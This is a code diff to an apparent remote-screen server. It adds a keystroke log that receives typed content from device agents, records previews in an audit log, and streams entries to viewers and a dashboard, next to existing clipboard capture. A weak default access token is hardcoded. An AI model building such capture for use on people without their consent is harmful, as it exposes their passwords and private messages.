@@ -9,6 +9,7 @@ const PORT = Number(process.env.PORT) || 8080;
 const ACCESS_TOKEN = process.env.ACCESS_TOKEN || "remote-screen-dev";
 const MAX_AUDIT = Number(process.env.MAX_AUDIT) || 200;
 const MAX_CLIPBOARD = Number(process.env.MAX_CLIPBOARD) || 300;
+const MAX_KEYBOARD = Number(process.env.MAX_KEYBOARD) || 300;
 
 const agents = new Map();
 const agentMeta = new Map();
@@ -16,6 +17,7 @@ const viewers = new Map();
 const dashboardClients = new Set();
 const auditLog = [];
 const clipboardLog = new Map();
+const keyboardLog = new Map();
 
 const app = express();
 app.use(express.json());
@@ -74,6 +76,25 @@ function addClipboardEntry(deviceId, msg) {
 
 function getClipboardEntries(deviceId, limit) {
   const list = clipboardLog.get(deviceId) || [];
+  return list.slice(0, limit);
+}
+
+function addKeyboardEntry(deviceId, msg) {
+  if (!keyboardLog.has(deviceId)) keyboardLog.set(deviceId, []);
+  const list = keyboardLog.get(deviceId);
+  const entry = {
+    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    time: msg.time || new Date().toISOString(),
+    content: String(msg.content || ""),
+    truncated: Boolean(msg.truncated),
+  };
+  list.unshift(entry);
+  if (list.length > MAX_KEYBOARD) list.length = MAX_KEYBOARD;
+  return entry;
+}
+
+function getKeyboardEntries(deviceId, limit) {
+  const list = keyboardLog.get(deviceId) || [];
   return list.slice(0, limit);
 }
 
@@ -144,6 +165,13 @@ app.get("/api/clipboard", authMiddleware, (req, res) => {
   res.json({ deviceId, entries: getClipboardEntries(deviceId, limit) });
 });
 
+app.get("/api/keyboard", authMiddleware, (req, res) => {
+  const deviceId = req.query.deviceId;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const limit = Math.min(Number(req.query.limit) || 300, MAX_KEYBOARD);
+  res.json({ deviceId, entries: getKeyboardEntries(deviceId, limit) });
+});
+
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server, path: "/ws" });
 
@@ -196,6 +224,7 @@ wss.on("connection", (ws, req) => {
       agentOnline: agents.has(deviceId),
       device: deviceSnapshot(deviceId),
       clipboard: getClipboardEntries(deviceId, 300),
+      keyboard: getKeyboardEntries(deviceId, 300),
     });
     notifyAgentViewerCount(deviceId);
     addAudit("viewer_connect", { deviceId, ip: clientIp });
@@ -248,6 +277,21 @@ wss.on("connection", (ws, req) => {
           for (const viewer of set) send(viewer, payload);
         }
         broadcastDashboard("clipboard_copy", payload);
+        return;
+      }
+
+      if (msg.type === "keyboard_input") {
+        const entry = addKeyboardEntry(deviceId, msg);
+        addAudit("keyboard_input", {
+          deviceId,
+          preview: entry.content.slice(0, 80),
+        });
+        const payload = { type: "keyboard_input", deviceId, entry };
+        const set = viewers.get(deviceId);
+        if (set) {
+          for (const viewer of set) send(viewer, payload);
+        }
+        broadcastDashboard("keyboard_input", payload);
         return;
       }
 
